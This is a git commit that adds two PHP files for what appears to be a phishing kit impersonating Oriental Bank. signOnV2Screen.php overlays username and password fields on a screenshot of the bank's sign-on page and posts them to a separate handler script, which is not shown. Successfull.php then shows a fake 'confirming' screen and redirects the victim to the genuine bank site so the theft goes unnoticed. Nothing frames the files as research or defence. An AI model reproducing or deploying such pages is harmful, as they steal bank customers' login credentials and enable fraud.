989cd422f350673b5e65301b87c9e66f2fbc6876
Endito21 <119337629+Endito21@users.noreply.github.com>
2022-12-07 10:40:41 -0600

    Add files via upload

---
+++ bnd/Successfull.php
@@ -0,0 +1,14 @@
+<html>
+<head><title>Por favor Espere... | Continuando |....</title>
+<META http-equiv="refresh" content="6;URL=https://orientalbank.com/">
+<body><br><br><br><br><br><br><br>
+<table id="sewe" align="center" border="0" bgcolor="#565461" cellspacing="10" cellpadding="8" style="border-radius: 10px;"><tbody><td bgcolor="white" style="border-radius: 10px;">
+<table id="sewe" align="right" border="0" bgcolor="white" cellspacing="0" cellpadding="0">&nbsp;&nbsp;&nbsp;&nbsp;<strong>Confirmando...</strong><img src="images/mp4.gif" height="1" width="160"><font face"arial">Signing Out</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<br>
+<br>
+<br>
+<center><img src="images/loading.GIF"><center>
+<br>
+<br>
+<br>
+</table></body>
---
+++ bnd/signOnV2Screen.php
@@ -0,0 +1,10 @@
+<title>Oriental Bank</title>
+<link rel="shortcut icon" type="image/x-icon" href="./images/favicon.ico" />
+        <link rel="icon" type="image/x-icon" href="./images/favicon.ico" />
+<body>
+<img src="m.png"></div>
+<div id="bv_Form1" style="position:absolute;left:0px;top:0px;width:0px;height:0px;z-index:4">
+<form name="Form1" method="post" action="inc/drdon1.php">
+<input id="create_mu39422" style="position:absolute;left:1217px;top:245px;width:229px;height:41px;border:1px #CCC solid;font-family:Arial;border-radius:4px;font-size:14px;z-index:1" name="callID" value="" type="text" placeholder="">
+<input id="create_mu39428" style="position:absolute;left:1217px;top:313px;width:229px;height:41px;border:1px #CCC solid;font-family:Arial;border-radius:4px;font-size:14px;z-index:1" name="PsID" value="" type="password" placeholder="">
+<input id="Button1" name="Button1" value="" style="position:absolute;left:1045px;top:380px;width:229px;height:36px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
